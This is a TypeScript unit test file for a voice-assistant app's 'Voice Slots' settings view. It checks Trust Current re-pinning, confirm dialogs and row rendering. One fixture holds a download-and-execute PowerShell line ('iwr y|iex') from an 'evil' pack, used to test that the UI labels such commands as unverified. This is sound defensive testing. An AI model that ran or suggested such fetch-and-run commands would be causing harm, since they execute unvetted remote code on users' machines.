// Voice Slots page view (voice slots V6). Trust Current re-pins files the user has not vetted, so
// it is offered on a pin-mismatch row only; that row is recognised by the reason prefix Rust writes
// (src-tauri/src/voice_slots/mod.rs), a cross-language contract. jsdom stands in for WebView2.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { JSDOM } from "jsdom";

const { window } = new JSDOM("<!doctype html><html><body></body></html>");
Object.assign(globalThis, { window, document: window.document, HTMLElement: window.HTMLElement });
const { renderVoiceSlots, PIN_MISMATCH_PREFIX, PIN_MISMATCH_HINT } = await import("../src/settings/voice-slots-view.ts");

const base = {
  required: true, reason: null, adapter: null, label: null, model: null, bytes: null, licence: null,
  source: null, pinned: null, recommended: null, recommendedModel: null, fill: null, file: null, models: [],
};

test("the pin-mismatch prefix matches the reason Rust writes", () => {
  const rs = readFileSync(new URL("../src-tauri/src/voice_slots/mod.rs", import.meta.url), "utf8");
  assert.ok(rs.includes(`"${PIN_MISMATCH_PREFIX}: {}${PIN_MISMATCH_HINT}"`), `mod.rs no longer writes "${PIN_MISMATCH_PREFIX}: <path>${PIN_MISMATCH_HINT}"`);
});

test("Trust Current shows on the pin-mismatch row only and re-pins only after a confirm naming the path", () => {
  const rows = [
    { ...base, slot: "stt", state: "broken", reason: `${PIN_MISMATCH_PREFIX}: C:\\m\\ggml.bin` },
    { ...base, slot: "wake", state: "broken", reason: "Unknown Pick: x/y" },
    { ...base, slot: "rewrite", state: "filled", pinned: "yes" },
    { ...base, slot: "tts", state: "missing", reason: "Model Not Found" },
    { ...base, slot: "stt", state: "broken", reason: `${PIN_MISMATCH_PREFIX}: stray` },
  ];
  const asked = [];
  const trusted = [];
  const actions = { redetect() {}, copy() {}, cancelTrust() {}, askTrust: (s) => asked.push(s), trust: (s) => trusted.push(s) };
  const root = document.createElement("div");
  renderVoiceSlots(root, rows, null, false, actions);
  const buttons = [...root.querySelectorAll(".vs-trust")];
  assert.equal(buttons.length, 1);
  assert.equal(buttons[0].closest(".vs-row").getAttribute("data-slot"), "stt");
  buttons[0].click();
  assert.deepEqual([asked, trusted], [["stt"], []]);

  renderVoiceSlots(root, rows, null, false, actions, { confirming: "stt" });
  assert.match(root.querySelector(".vs-confirm-text").textContent, /C:\\m\\ggml\.bin/);
  root.querySelector(".vs-trust-confirm").click();
  assert.deepEqual(trusted, ["stt"]);
});

test("an unverified pack fill is labelled on its Copy button", () => {
  const rows = [{ ...base, slot: "tts", state: "missing", fill: "from evil, unverified: pwsh -File x.ps1\niwr y|iex" }];
  const copied = [];
  const root = document.createElement("div");
  renderVoiceSlots(root, rows, null, false, { redetect() {}, askTrust() {}, trust() {}, cancelTrust() {}, copy: (t) => copied.push(t) });
  const copy = root.querySelector(".vs-copy");
  assert.equal(copy.getAttribute("aria-label"), "Copy (Unverified)");
  assert.ok(root.querySelector(".vs-fill").classList.contains("is-unverified"));
  copy.click();
  assert.deepEqual(copied, ["! pwsh -File x.ps1\niwr y|iex"]);
  assert.match(root.querySelector(".vs-unverified").title, /^From evil, Unverified/);
});

test("a slot row is name, state icon, one pick line and its setup chip; the detail sits in tooltips", () => {
  const rows = [
    { ...base, slot: "stt", state: "missing", reason: "No Pick", recommended: "voice-stock/whisper-cli", recommendedModel: "tiny.en-q8_0",
      fill: "pwsh -File C:\\long\\path\\fetch-whisper.ps1 -Model tiny.en-q8_0" },
    { ...base, slot: "rewrite", required: false, state: "missing", reason: "Not Found: C:\\v\\python.exe",
      adapter: "claude/claude-p", label: "claude -p", model: "claude-sonnet-5-5", source: { kind: "pack", pack: "claude" } },
    { ...base, slot: "wake", required: false, state: "empty", reason: "Empty (Optional)" },
  ];
  const root = document.createElement("div");
  renderVoiceSlots(root, rows, null, false, { redetect() {}, askTrust() {}, trust() {}, cancelTrust() {}, copy() {} });
  assert.equal(root.querySelector(".vs-summary").textContent, "2 Slots Need Attention");
  const stt = root.querySelector('[data-slot="stt"]');
  assert.equal(stt.querySelector(".vs-head").textContent, "Speech To Text");
  assert.equal(stt.querySelector(".vs-state").title, "Missing: No Pick");
  assert.equal(stt.querySelector(".vs-pick").textContent, "voice-stock/whisper-cli · tiny.en-q8_0");
  const cmd = "! pwsh -File C:/long/path/fetch-whisper.ps1 -Model tiny.en-q8_0";
  assert.equal(stt.querySelector(".vs-cmd").title, cmd);
  assert.equal(stt.querySelector(".vs-copy").getAttribute("data-text"), cmd);
  const rewrite = root.querySelector('[data-slot="rewrite"]');
  assert.equal(rewrite.querySelector(".vs-state").title, "Missing (Optional): Not Found: C:\\v\\python.exe");
  assert.equal(rewrite.querySelector(".vs-pick").textContent, "claude/claude-p · claude-sonnet-5-5");
  assert.match(rewrite.querySelector(".vs-pick").title, /Adapter: claude -p \(claude\/claude-p\)\nModel: claude-sonnet-5-5\nSource: Pack claude/);
  const wake = root.querySelector('[data-slot="wake"] .vs-state');
  assert.equal(wake.title, "Empty (Optional)");
  assert.ok(wake.classList.contains("is-dim"));
});
